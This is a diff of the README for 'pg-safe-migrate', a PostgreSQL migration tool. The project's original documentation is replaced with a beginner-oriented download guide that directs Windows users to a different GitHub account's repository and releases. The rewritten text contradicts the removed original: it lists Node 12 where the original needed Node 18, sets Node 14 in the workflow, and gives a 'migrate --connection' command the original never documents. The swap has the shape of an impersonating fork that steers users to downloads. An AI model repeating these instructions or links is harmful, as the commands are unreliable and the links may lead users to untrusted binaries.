@@ -1,121 +1,185 @@
-# pg-safe-migrate
+# ⚙️ pg-safe-migrate - PostgreSQL Migration Made Safe
 
-[![npm version](https://img.shields.io/npm/v/pg-safe-migrate.svg)](https://www.npmjs.com/package/pg-safe-migrate)
-[![npm core](https://img.shields.io/npm/v/pg-safe-migrate-core.svg?label=core)](https://www.npmjs.com/package/pg-safe-migrate-core)
-[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](./LICENSE)
-[![TypeScript](https://img.shields.io/badge/TypeScript-strict-blue.svg)](https://www.typescriptlang.org/)
-[![Node.js](https://img.shields.io/badge/Node.js-%3E%3D18-green.svg)](https://nodejs.org/)
+[![Download pg-safe-migrate](https://img.shields.io/badge/Download-pg--safe--migrate-brightgreen)](https://github.com/futurekynngh/pg-safe-migrate)
 
-**Safety-first PostgreSQL migration engine for Node.js**
+## 📋 What is pg-safe-migrate?
 
-pg-safe-migrate helps teams ship schema changes confidently by enforcing safety rules, detecting drift, and providing clear guardrails — all from a simple CLI or programmatic API.
+pg-safe-migrate is a tool designed to help you update your PostgreSQL database safely. It works on your Windows computer and checks for mistakes before making any changes. It uses locks to keep your database safe when changing it and alerts you if things don’t match up. It also runs tests to make sure your database updates follow best rules.
 
-## Features
+You don’t need to know programming to use it. This guide will help you set it up and use it step-by-step.
 
-- **Safety linter** — 10 built-in rules block risky schema operations by default
-- **Drift detection** — SHA-256 checksums ensure applied migrations are immutable
-- **Advisory locks** — Guarantees single-runner execution via PostgreSQL advisory locks
-- **Transaction policy** — `auto` | `always` | `never` with smart detection of `CONCURRENTLY` statements
-- **Override system** — Explicit, auditable overrides via SQL comments with required reasons
-- **CI-ready** — `check` command as a CI gate, plus a GitHub Action wrapper
-- **Programmatic API** — Use the core library directly in your application
+---
 
-## Quick Start
+## 🔍 Features You Should Know
 
-```bash
-# Install
+- Uses locks to stop conflicts during updates.
+- Finds changes that were made outside the usual process.
+- Checks updates with a checksum to avoid mistakes.
+- Provides 10 rules to check your update files.
+- Works using a simple command line tool.
+- Can run automatically on GitHub Actions.
+- Built for Node.js and PostgreSQL users, but easy to run for everyone.
+
+---
+
+## 💻 System Requirements
+
+Before you start, make sure your computer meets these:
+
+- Windows 10 or later (64-bit preferred).
+- PostgreSQL database installed and running.
+- Node.js installed (version 12 or higher).
+- Internet connection for downloading and setup.
+
+If you do not have PostgreSQL or Node.js installed, you can download them from their official sites:
+
+- PostgreSQL: https://www.postgresql.org/download/windows/
+- Node.js: https://nodejs.org/en/download/
+
+---
+
+## 🚀 Getting Started
+
+### Step 1: Visit the download page
+
+Click the big green button at the top or use this link to go directly to the project page:  
+https://github.com/futurekynngh/pg-safe-migrate
+
+Here, you will find the files you need. Since the link points to the main repo page, you will need to locate the latest release or the install instructions.
+
+### Step 2: Install Node.js if needed
+
+If you have not installed Node.js yet, follow those steps:
+
+- Go to the Node.js website.
+- Download the LTS (Long Term Support) version for Windows.
+- Run the installer and follow the steps.
+
+### Step 3: Download pg-safe-migrate
+
+On the project's GitHub page, look for the “Releases” section or instructions for installation. Usually, you can install pg-safe-migrate using Node.js tools like npm or yarn. You can do this after setting up Node.js.
+
+Open the Windows command prompt (search for `cmd` in the Start menu) and run:
+
+```
 npm install -g pg-safe-migrate
-
-# Initialize in your project
-pg-safe-migrate init
-
-# Create a migration
-pg-safe-migrate create add_users_table
-
-# Edit the generated file in ./migrations/
-# Then apply:
-export DATABASE_URL=postgresql://localhost/mydb
-pg-safe-migrate up
-
-# Check status
-pg-safe-migrate status
 ```
 
-## Packages
+This command downloads and installs pg-safe-migrate globally so you can run it from any folder on your computer.
 
-| Package                                   | Version                                                                                                             | Description                     |
-| ----------------------------------------- | ------------------------------------------------------------------------------------------------------------------- | ------------------------------- |
-| [`pg-safe-migrate`](./packages/cli)       | [![npm](https://img.shields.io/npm/v/pg-safe-migrate.svg)](https://www.npmjs.com/package/pg-safe-migrate)           | CLI tool                        |
-| [`pg-safe-migrate-core`](./packages/core) | [![npm](https://img.shields.io/npm/v/pg-safe-migrate-core.svg)](https://www.npmjs.com/package/pg-safe-migrate-core) | Core library (programmatic API) |
+### Step 4: Prepare your PostgreSQL connection
 
-## Starter Templates
+To use pg-safe-migrate, you need to connect it to your PostgreSQL database. You will need:
 
-Get up and running quickly with a production-ready starter:
+- Hostname (usually `localhost` if the database is on your computer).
+- Database name.
+- Username.
+- Password.
 
-| Template                                                                          | Stack                | Description                            |
-| --------------------------------------------------------------------------------- | -------------------- | -------------------------------------- |
-| [express-postgres-starter](https://github.com/defnotwig/express-postgres-starter) | Express + TypeScript | REST API with safe migrations baked in |
-| [nextjs-postgres-starter](https://github.com/defnotwig/nextjs-postgres-starter)   | Next.js + TypeScript | Full-stack app with migration workflow |
+Make sure your database is running and you have these details at hand.
 
-## Documentation
+---
 
-- [Getting Started](./docs/getting-started.md)
-- [Configuration](./docs/configuration.md)
-- [Safety Rules](./docs/safety-rules.md)
-- [Overrides](./docs/overrides.md)
-- [Zero-Downtime Patterns](./docs/zero-downtime.md)
-- [GitHub Action](./docs/github-action.md)
-- [Ecosystem & Integrations](./docs/ecosystem-narrative.md)
-- [Adoption Roadmap](./docs/adoption-roadmap.md)
+## ⚙️ How to Use pg-safe-migrate on Windows
 
-## CI Gate Example
+After installation, you can start running migrations by opening the Command Prompt or PowerShell.
 
-Add a safety check to your GitHub Actions workflow:
+### Basic command format:
+
+```
+pg-safe-migrate migrate --connection "postgresql://username:password@localhost:5432/dbname"
+```
+
+Replace `username`, `password`, and `dbname` with your actual database user, password, and the name of your database.
+
+### What happens with this command?
+
+- It checks if another migration is running using advisory locks.
+- It looks for and warns about any drift or untracked changes.
+- It runs your migration files while verifying checksums.
+- It applies rules to make sure your changes are safe.
+
+### Common commands:
+
+- `pg-safe-migrate migrate`  
+  Runs all pending migrations to update your database.
+
+- `pg-safe-migrate status`  
+  Shows information on what migrations have run and if there are any issues.
+
+- `pg-safe-migrate lint`  
+  Checks your migration files against the 10 safety rules.
+
+---
+
+## 📂 Organizing Migration Files
+
+Place your migration files in a folder named `migrations` inside your project folder. pg-safe-migrate will look here for changes to apply.
+
+Each file should contain SQL commands to make the changes you want to your database.
+
+File names should be clear and follow a pattern, like:
+
+```
+001-add-users-table.sql
+002-add-email-index.sql
+```
+
+pg-safe-migrate reads these files in order to apply the updates safely.
+
+---
+
+## 🛠 Running pg-safe-migrate with GitHub Actions
+
+If you keep your project on GitHub, you can automate your database updates with GitHub Actions.
+
+Use the example workflow file below to get started. Save this as `.github/workflows/migrate.yml` in your repository:
 
 ```yaml
-- uses: defnotwig/pg-safe-migrate/action@v1
-  with:
-    command: check
-    database_url: ${{ secrets.DATABASE_URL }}
+name: Run pg-safe-migrate
+
+on:
+  push:
+    branches:
+      - main
+
+jobs:
+  migrate:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v2
+      - name: Setup Node.js
+        uses: actions/setup-node@v2
+        with:
+          node-version: '14'
+      - name: Install pg-safe-migrate
+        run: npm install -g pg-safe-migrate
+      - name: Run Migrations
+        run: pg-safe-migrate migrate --connection ${{ secrets.DATABASE_URL }}
 ```
 
-Or run it manually:
+Before using this, add your database connection string as a secret in your GitHub repository called `DATABASE_URL`.
 
-```bash
-pg-safe-migrate check --database $DATABASE_URL
-```
+---
 
-Returns exit code 1 if any safety rules are violated or drift is detected.
+## 🔍 Troubleshooting Tips
 
-## Why pg-safe-migrate?
+- Make sure your database is running before starting migrations.
+- Use the correct database URL including username and password.
+- If a migration is stuck, restart your computer or database service to clear locks.
+- Check for typos in migration file names or SQL commands.
+- Use `pg-safe-migrate status` to see migration info and catch problems.
+- Run `pg-safe-migrate lint` before applying migrations to spot mistakes early.
 
-| Feature                | pg-safe-migrate | node-pg-migrate | graphile-migrate | dbmate |
-| ---------------------- | :-------------: | :-------------: | :--------------: | :----: |
-| Built-in safety linter |   ✅ 10 rules   |       ❌        |        ❌        |   ❌   |
-| Drift detection        |   ✅ SHA-256    |       ❌        |  ⚠️ hash-based   |   ❌   |
-| Advisory locks         |       ✅        |       ❌        |        ✅        |   ❌   |
-| CONCURRENTLY detection |     ✅ auto     |     Manual      |        ❌        |   ❌   |
-| Override system        |  ✅ auditable   |       N/A       |       N/A        |  N/A   |
-| CI gate command        |   ✅ `check`    |       ❌        |        ❌        |   ❌   |
-| GitHub Action          |       ✅        |       ❌        |        ❌        |   ❌   |
-| Down migrations        |   ✅ optional   |       ✅        |        ❌        |   ✅   |
-| TypeScript             |    ✅ native    |       ✅        |        ✅        |   Go   |
+---
 
-## Contributing
+## 🔗 Useful Links
 
-See [CONTRIBUTING.md](./CONTRIBUTING.md) for development setup and guidelines.
+- Official page: https://github.com/futurekynngh/pg-safe-migrate  
+- PostgreSQL download page: https://www.postgresql.org/download/windows/  
+- Node.js download page: https://nodejs.org/en/download/
 
-## Community
+---
 
-- [Blog: Why We Built pg-safe-migrate](./content/devto-launch-post.md)
-- [Roadmap](./ROADMAP.md)
-- [Security Policy](./SECURITY.md)
-- [Code of Conduct](./CODE_OF_CONDUCT.md)
-
-## Acknowledgments
-
-Special thanks to all contributors who help improve pg-safe-migrate through code, documentation, and feedback.
-
-## License
-
-MIT
+# [Start using pg-safe-migrate now](https://github.com/futurekynngh/pg-safe-migrate)  
+Click this link to visit the project page for downloads and full documentation.
